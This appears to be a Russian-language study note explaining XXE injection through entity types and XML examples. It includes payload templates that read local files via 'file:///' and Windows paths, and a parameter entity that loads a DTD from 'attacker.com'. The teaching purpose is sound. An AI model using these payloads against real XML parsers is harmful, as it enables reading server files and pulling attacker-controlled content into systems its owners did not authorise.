XXE реализуется путем внедрения в XML внешних сущностей (файл сервера или URL). 
## Источники информации
- [PayloadAllTheThings XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
## Общая информация
Пример XML: 
```XML
<?xml version="1.0"?>
<!DOCTYPE xxe [
 <!ENTITY name "Вася">
]>
<note>
 <to>&name;</to>
 <from>Света</from>
 <heading>Напоминание</heading>
 <body>Позвони мне завтра!</body>
</note>
```
В примере определяется внутренняя сущности `name`, которая вставляется в содержимое через `&name;`.
Сущность может быть загружена из следующих источников:
- Сторонний ресурс:
```XML
<?xml version="1.0"?>
<!DOCTYPE to [
 <!ENTITY name SYSTEM "URL">
]>
<to>&name;</to>
```
- Файловая система ОС Linux:
```XML
<?xml version="1.0"?>
<!DOCTYPE to [
 <!ENTITY name SYSTEM "file:///filename">
]>
<to>&name;</to>
```
- Файловая система ОС Windows:
```XML
<?xml version="1.0"?>
<!DOCTYPE to [
 <!ENTITY name SYSTEM "C:\\filename">
]>
<to>&name;</to>
```
Cущности делятся на два вида: general entity и parameter entity.
General entity или обычные сущности – это сущности, оперирующие константными значениями. Пример: `<!ENTITY имя_сущности "значение">`.
Обычные сущности тоже делятся на два вида: 
- Internal или внутренние сущности работают только с теми значениями, которые описаны внутри документа. 
- External или внешние сущности необходимы для того, чтобы использовать в XML код, хранящийся в другом файле. Пример: `<!ENTITY имя_сущности SYSTEM "путь до файла">`.
Параметрические сущности (parameter entities) используются внутри DTD и позволяют подключать как внешний текст, так и дополнительные определения сущностей, содержащиеся во внешних файлах.
Пример:
```XML
<?xml version="1.0"?>
<!DOCTYPE root [
 <!ENTITY % ent SYSTEM "http://attacker.com/entities.dtd">
 %ent;
]>
<root>
 <data>&injected;</data>
</root>
```
Файл entities.dtd содержит следующее:
```XML
<!ENTITY injected "Значение из внешнего файла">
```
После подключения `%ent;` сущность `&injected;` становится доступной в основном документе.